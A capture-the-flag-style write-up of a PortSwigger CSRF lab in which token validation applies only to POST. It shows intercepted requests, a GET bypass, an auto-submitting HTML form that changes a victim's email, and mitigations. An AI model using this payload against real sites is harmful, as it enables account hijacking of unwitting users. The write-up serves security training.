# 📘 PortSwigger Lab: CSRF where token validation depends on request method

<a id="top"></a>

🔗 **Official Lab:** https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method  
🎯 **Topic:** CSRF — bypassing token validation via HTTP method change  
🧪 **Difficulty:** Practitioner  
✅ **Status:** Solved  
🛠 **Tools:** Burp Suite (Proxy, Repeater), Exploit Server  
🔑 **Credentials:** `wiener:peter`

---

## 📑 Contents
- [📘 PortSwigger Lab: CSRF where token validation depends on request method](#-portswigger-lab-csrf-where-token-validation-depends-on-request-method)
  - [📑 Contents](#-contents)
  - [🎯 Goal](#-goal)
  - [🧠 Short Theory](#-short-theory)
  - [🧩 Core Idea](#-core-idea)
  - [🗺 Attack Scheme](#-attack-scheme)
  - [🔍 Step 1 — Analyze Legitimate Request](#-step-1--analyze-legitimate-request)
  - [🔍 Step 2 — Verify Token Validation](#-step-2--verify-token-validation)
  - [🔍 Step 3 — Change HTTP Method](#-step-3--change-http-method)
  - [🔍 Step 4 — Build CSRF Exploit](#-step-4--build-csrf-exploit)
  - [🔍 Step 5 — Test Exploit on Yourself](#-step-5--test-exploit-on-yourself)
  - [🔍 Step 6 — Deliver Exploit to Victim](#-step-6--deliver-exploit-to-victim)
  - [📨 Example Requests](#-example-requests)
  - [📥 Example Result](#-example-result)
  - [🧾 Complete Attack Chain](#-complete-attack-chain)
  - [🔬 Why the Attack Worked](#-why-the-attack-worked)
  - [🧠 Pentester Mindset](#-pentester-mindset)
  - [❌ Common Mistakes](#-common-mistakes)
  - [🛡 Mitigation](#-mitigation)
  - [✅ Checklist](#-checklist)
  - [🧾 Conclusion](#-conclusion)

---

<a id="goal"></a>
## 🎯 Goal
The email change functionality is protected by a CSRF token, but the token is validated only for POST requests. The task:

1. Use the exploit server to host an HTML page that performs a CSRF attack.
2. Change the victim's email address via CSRF.

*Hint: The defense is applied only to certain types of requests.*

<a id="theory"></a>
## 🧠 Short Theory
CSRF (Cross-Site Request Forgery) is an attack where the attacker forces the victim's browser to perform an unwanted action on a vulnerable site where the victim is authenticated.

The standard defense is a CSRF token that must be present in every state-changing request. However, if the server validates the token only for POST while processing GET requests without validation, the defense can be bypassed by simply changing the method. A GET request can be easily triggered via `<form method="GET">`, `<img>`, or browser navigation — without any CORS restrictions.

<a id="idea"></a>
## 🧩 Core Idea
Changing the method POST → GET bypasses CSRF token validation.

- A GET request can be triggered from any domain via a simple HTML form — the browser automatically sends the victim's cookies.
- No token in GET means the exploit does not require knowledge of the victim's CSRF token.
- Auto-submit via JavaScript makes the attack invisible to the victim.

<a id="attack-scheme"></a>
## 🗺 Attack Scheme
1. **Recon:** Intercept `POST /my-account/change-email` with csrf token.
2. **Verify:** Modify csrf → rejected (token validated for POST).
3. **Bypass:** Change request method → GET → token not validated.
4. **Exploit:** HTML form `method="GET"` + auto-submit.
5. **Test:** View exploit on yourself → email changed.
6. **Deliver:** Deliver to victim → lab solved.

<a id="step1"></a>
## 🔍 Step 1 — Analyze Legitimate Request
Logged in as `wiener:peter`, submitted the "Update email" form, and intercepted the request in Burp Proxy.

```http
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=CSRF_TOKEN
```

<a id="step2"></a>
## 🔍 Step 2 — Verify Token Validation
Sent the request to Burp Repeater and changed the `csrf` value to an arbitrary one → the server returned an error. The token is validated for POST requests.

<a id="step3"></a>
## 🔍 Step 3 — Change HTTP Method
Used "Change request method" from the Repeater context menu — the request was converted to GET:

```http
GET /my-account/change-email?email=test@test.com&csrf=CSRF_TOKEN HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_COOKIE
```
**Result:** the CSRF token is no longer validated, the email is successfully changed even with an incorrect/missing token.

*Conclusion: the defense is tied to the HTTP method, not to the action itself.*

<a id="step4"></a>
## 🔍 Step 4 — Build CSRF Exploit
Since a GET request can be triggered by a simple form (default method is GET), created the following HTML for the exploit server:

```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email">
   <input type="hidden" name="email" value="attacker@web-security-academy.net">
</form>
<script>
   document.forms[0].submit();
</script>
```
*Important: the email parameter goes into the query string, no CSRF token required.*

<a id="step5"></a>
## 🔍 Step 5 — Test Exploit on Yourself
Placed the HTML in the exploit server body, stored it, and clicked "View exploit". In Burp Proxy confirmed the request goes as GET and the email changes. Then changed the address in the exploit so it doesn't match the current one.

<a id="step6"></a>
## 🔍 Step 6 — Deliver Exploit to Victim
Stored the exploit and clicked "Deliver to victim". The victim's email was changed → lab solved.

<a id="requests"></a>
## 📨 Example Requests
**Legitimate POST (with token)**
```http
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=CSRF_TOKEN
```

**Bypass via GET (no token validation)**
```http
GET /my-account/change-email?email=attacker@web-security-academy.net HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_COOKIE
```

<a id="response"></a>
## 📥 Example Result
**Token Validation Check (POST)**
- POST with modified csrf → "Invalid CSRF token" (rejected)
- POST with valid csrf → 302 Redirect (success)

**Bypass via GET**
- GET with invalid/missing csrf → 302 Redirect (success)  
→ Email changed without token validation

<a id="attack-chain"></a>
## 🧾 Complete Attack Chain
1. `POST /my-account/change-email` → intercept, csrf token present.
2. Repeater → modify csrf → rejected (token validated).
3. Change request method → GET → token not validated.
4. Exploit Server → HTML form `method="GET"` + auto-submit.
5. View exploit → test on yourself → email changed.
6. Deliver to victim → victim's email changed → **Solved**.

<a id="breakdown"></a>
## 🔬 Why the Attack Worked
- **Inconsistent protection:** the CSRF token is validated only for POST, GET is processed without validation.
- **HTTP semantics violated:** GET is used for a state-changing operation, although it should be safe and idempotent.
- **GET is easy to trigger cross-origin:** `<form method="GET">` does not require a CORS preflight, the victim's cookies are sent automatically.
- **Auto-submit:** JavaScript submits the form instantly, the victim does not notice the attack.

<a id="pentester"></a>
## 🧠 Pentester Mindset
1. **Test all HTTP methods:** POST, GET, PUT, DELETE — protection may exist on only one.
2. **Try Change request method:** a common flaw is validation tied to the method.
3. **Look for state-changing GET:** operations that change state via GET are a red flag.
4. **Try removing the token:** if the request passes without it, protection is incomplete.
5. **Use the Exploit Server:** the standard PortSwigger tool for CSRF labs.

<a id="mistakes"></a>
## ❌ Common Mistakes
- **Forgot to change the email in the exploit:** if the address matches the current one, no change occurs — the lab won't be solved.
- **Using POST in the exploit:** the form defaults to GET, but explicitly setting `method="POST"` requires a token.
- **Not testing on yourself:** "View exploit" helps confirm the request goes as GET and the email changes.
- **Forgot auto-submit:** without `<script>` the form won't submit automatically — the victim would need to click a button.
- **Wrong lab URL:** the action must point to the real LAB-ID.

<a id="defense"></a>
## 🛡 Mitigation
- Validate the CSRF token **regardless of HTTP method** — validation tied to the action (endpoint), not the request type.
- **Do not use GET** for state-changing operations — follow HTTP method semantics.
- Use frameworks with built-in CSRF protection covering all unsafe methods.
- **SameSite cookies** (Lax/Strict) as defense in depth.
- Check **Origin/Referer** headers for state-changing requests.

<a id="checklist"></a>
## ✅ Checklist
- [ ] Intercepted POST request with csrf token
- [ ] Confirmed: modifying csrf → rejected (POST)
- [ ] Change request method → GET → token not validated
- [ ] Built HTML exploit with `method="GET"` + auto-submit
- [ ] View exploit → tested on yourself → email changed
- [ ] Email in exploit differs from current
- [ ] Deliver to victim → lab solved
- [ ] Status: **Solved**

<a id="conclusion"></a>
## 🧾 Conclusion
The lab demonstrates a classic flaw: the protection mechanism is implemented inconsistently — only for one HTTP method. Key lesson: the security of an action must not depend on how it is invoked — if an endpoint changes state, it must be protected under any method. Changing POST to GET bypassed the CSRF protection, and a simple HTML form with auto-submit allowed changing the victim's email.

⬆ [Back to top](#top)
